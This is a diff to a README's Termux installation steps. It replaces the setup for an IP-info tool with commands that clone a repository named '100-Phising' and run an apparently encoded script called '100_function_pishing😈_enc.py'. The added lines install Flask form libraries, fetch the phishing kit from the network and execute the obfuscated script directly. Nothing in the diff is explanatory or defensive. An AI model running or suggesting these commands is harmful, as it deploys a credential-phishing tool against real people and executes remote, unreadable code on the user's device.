@@ -3,10 +3,10 @@ Open **Termux** and enter:
 ```
 apt update && apt upgrade
 pkg install python
+pip install flask flask-wtf wtforms colorama
+pip install -r requirements.txt
 pkg install git
-pip install requests
-pip install termcolor
-pip install pyfiglet
-git clone https://github.com/DHThackers-10/DHT-IP-INFO.git
-cd DHT-IP-INFO
+git clone https://github.com/Cpmhaoproject/100-Phising.git
+cd 100-Phising
+python 100_function_pishing😈_enc.py
 ```
